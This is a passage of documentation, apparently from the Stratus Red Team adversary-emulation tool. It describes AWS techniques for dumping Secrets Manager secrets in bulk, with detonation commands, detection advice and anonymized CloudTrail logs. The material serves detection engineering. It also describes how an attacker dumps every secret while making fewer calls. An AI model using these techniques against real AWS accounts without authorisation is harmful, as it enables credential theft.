       ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9e3d2872-6af8-4137-8e17-276c8b34f357\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:04Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"72b94fe4-c828-4bdf-a002-7d2af722d687\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f37811bd-6506-4785-b8e7-3a67885d9a31\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:03Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"3e2526bb-b0a8-4bcb-ae3b-5c88f6c04f1c\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"65965073-1feb-46ea-95b3-c7b90937c70f\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:00Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"eba9f797-3323-451c-93eb-f3c57269a524\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e805f60c-ada5-4dc3-9f4d-636a9978b30a\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:59Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"80f88172-f800-48b4-94cb-d95cbecdbc8c\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2a96648a-6f8a-4faa-b5fc-432fab0eee81\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"4f2d4d99-274a-4133-b122-abac714570c1\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/","title":"Retrieve a High Number of Secrets Manager secrets (Batch)","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Credential Access</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/#description","title":"Description","text":"<p>Retrieves a high number of Secrets Manager secrets by batch, through <code>secretsmanager:BatchGetSecretValue</code> (released Novemeber 2023).  An attacker may attempt to retrieve a high number of secrets by batch, to avoid detection and generate fewer calls. Note that the batch size is limited to 20 secrets.</p> <p>Warm-up: </p> <ul> <li>Create multiple secrets in Secrets Manager.</li> </ul> <p>Detonation: </p> <ul> <li>Dump all secrets by batch of 10, using <code>secretsmanager:BatchGetSecretValue</code>.</li> </ul> <p>References:</p> <ul> <li>https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud</li> <li>https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud/</li> <li>https://aws.amazon.com/blogs/security/how-to-use-the-batchgetsecretsvalue-api-to-improve-your-client-side-applications-with-aws-secrets-manager/</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.secretsmanager-batch-retrieve-secrets\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/#detection","title":"Detection","text":"<p>Identify principals that attempt to retrieve secrets by batch, through CloudTrail's <code>BatchGetSecretValue</code> event. Sample event:</p> <pre><code>{\n  \"eventSource\": \"secretsmanager.amazonaws.com\",\n  \"eventName\": \"BatchGetSecretValue\",\n  \"requestParameters\": {\n    \"filters\": [\n      {\n        \"key\": \"tag-key\",\n        \"values\": [\n          \"StratusRedTeam\"\n        ]\n      }\n    ]\n  },\n  \"responseElements\": null,\n  \"readOnly\": true,\n  \"eventType\": \"AwsApiCall\",\n  \"managementEvent\": true,\n  \"recipientAccountId\": \"012345678901\"\n}\n</code></pre> <p>Although <code>BatchGetSecretValue</code> requires a list of secret IDs or a filter, an attacker may use a catch-all filter to retrieve all secrets by batch:</p> <pre><code>{\n  \"eventSource\": \"secretsmanager.amazonaws.com\",\n  \"eventName\": \"BatchGetSecretValue\",\n  \"requestParameters\": {\n    \"filters\": [\n      {\n        \"key\": \"tag-key\",\n        \"values\": [\n          \"!tagKeyThatWillNeverExist\"\n        ]\n      }\n    ]\n  },\n  \"responseElements\": null,\n  \"readOnly\": true,\n  \"eventType\": \"AwsApiCall\",\n  \"managementEvent\": true,\n  \"recipientAccountId\": \"012345678901\"\n}\n</code></pre> <p>The following may be use to tune the detection, or validate findings:</p> <ul> <li>Principals who do not usually call GetBatchSecretValue</li> <li>Attempts to call GetBatchSecretValue resulting in access denied errors</li> <li>Principals calling GetBatchSecretValue in several regions in a short period of time</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>secretsmanager:BatchGetSecretValue</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"eu-westwest-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"61619dbf-c10b-471e-9d78-8199a2f8233a\",\n      \"eventName\": \"BatchGetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:29:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"165109126369\",\n      \"requestID\": \"d493c657-4004-4105-81f0-8f468ba0c9b3\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"tag-key\",\n               \"values\": [\n                  \"StratusRedTeam\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"88.223.251.255\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.eu-westwest-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_0a05817a-84d2-40d7-afde-8311715b1ee6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIALK3Q0HKBKZJ2XBYP\",\n         \"accountId\": \"165109126369\",\n         \"arn\": \"arn:aws:iam::165109126369:user/christophe\",\n         \"principalId\": \"AIDAIOBKTJ7YOYY9TKC4\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"eu-westwest-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7c7a69f9-867d-4b5b-beee-7fe62ba34d5c\",\n      \"eventName\": \"BatchGetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:29:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"165109126369\",\n      \"requestID\": \"6b6e2935-39ad-44d9-9a62-eeb63e95bd69\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"tag-key\",\n               \"values\": [\n                  \"StratusRedTeam\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"88.223.251.255\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.eu-westwest-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_0a05817a-84d2-40d7-afde-8311715b1ee6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIALK3Q0HKBKZJ2XBYP\",\n         \"accountId\": \"165109126369\",\n         \"arn\": \"arn:aws:iam::165109126369:user/christophe\",\n         \"principalId\": \"AIDAIOBKTJ7YOYY9TKC4\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"eu-westwest-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"cf4e352a-b575-4003-bd81-0c531f42e626\",\n      \"eventName\": \"BatchGetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:29:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"165109126369\",\n      \"requestID\": \"cd93c41b-cb19-4a2c-9f35-6a1becee24ce\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"tag-key\",\n               \"values\": [\n                  \"StratusRedTeam\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"88.223.251.255\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.eu-westwest-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_0a05817a-84d2-40d7-afde-8311715b1ee6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIALK3Q0HKBKZJ2XBYP\",\n         \"accountId\": \"165109126369\",\n         \"arn\": \"arn:aws:iam::165109126369:user/christophe\",\n         \"principalId\": \"AIDAIOBKTJ7YOYY9TKC4\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"eu-westwest-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"bddee0fb-2541-430d-aad5-b1fdd5d419f1\",\n      \"eventName\": \"BatchGetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:29:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"165109126369\",\n      \"requestID\": \"6bd1a472-24d2-46b5-abb6-83a9caf3e3ea\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"tag-key\",\n               \"values\": [\n                  \"StratusRedTeam\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"88.223.251.255\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.eu-westwest-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_0a05817a-84d2-40d7-afde-8311715b1ee6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIALK3Q0HKBKZJ2XBYP\",\n         \"accountId\": \"165109126369\",\n         \"arn\": \"arn:aws:iam::165109126369:user/christophe\",\n         \"principalId\": \"AIDAIOBKTJ7YOYY9TKC4\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"eu-westwest-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"cdc49957-9518-4ab3-a49e-b5a7c17903e6\",\n      \"eventName\": \"BatchGetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:29:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"165109126369\",\n      \"requestID\": \"be2e79d0-ef1a-47f1-90b4-bafbbaa7404c\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"tag-key\",\n               \"values\": [\n                  \"StratusRedTeam\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"88.223.251.255\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.eu-westwest-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_0a05817a-84d2-40d7-afde-8311715b1ee6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIALK3Q0HKBKZJ2XBYP\",\n         \"accountId\": \"165109126369\",\n         \"arn\": \"arn:aws:iam::165109126369:user/christophe\",\n         \"principalId\": \"AIDAIOBKTJ7YOYY9TKC4\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/","title":"Retrieve a High Number of Secrets Manager secrets","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Credential Access</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/#description","title":"Description","text":"<p>Retrieves a high number of Secrets Manager secrets, through secretsmanager:GetSecretValue.</p> <p>Warm-up: </p> <ul> <li>Create multiple secrets in Secrets Manager.</li> </ul> <p>Detonation: </p> <ul> <li>Enumerate the secrets through secretsmanager:ListSecrets</li> <li>Retrieve each secret value, one by one through secretsmanager:GetSecretValue</li> </ul> <p>References:</p> <ul> <li>https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud</li> <li>https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud/</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.secretsmanager-retrieve-secrets\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/#detection","title":"Detection","text":"<p>Identify principals retrieving a high number of secrets, through CloudTrail's GetSecretValue event.</p> <p>The following may be use to tune the detection, or validate findings:</p> <ul> <li>Principals who do not usually call secretsmanager:GetSecretValue</li> <li>Attempts to call GetSecretValue resulting in access denied errors</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>secretsmanager:GetSecretValue</code></p> </li> <li> <p><code>secretsmanager:ListSecrets</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b9c3d881-1e77-426c-abd3-5ca20d903380\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:52Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"c4fff253-825a-4828-adac-7f789f6975f3\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-18-4Rzn83\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"c63dd227-42e0-4934-8b29-52f4e583d54e\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:52Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"df133663-cdb1-4ea8-b795-eddf0152e16c\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-17-JF56OW\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0985f4e9-9263-423a-a499-fdd330c973c1\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"cf234c05-2c74-49e5-b632-5898071d4f86\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-2-WNXFB1\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"25b97ad2-f713-4a29-af76-659e736629aa\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"52b87720-e08a-4fd4-8daa-ad70f983ce68\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-14-3JB2S0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2d81c956-58c3-4336-ae4e-c0b9f2b96113\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"999b3685-f5e1-4008-9cc8-b83121ab679e\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-9-BHrKxX\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"853be248-0703-49a6-ba35-256dfbac47ab\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      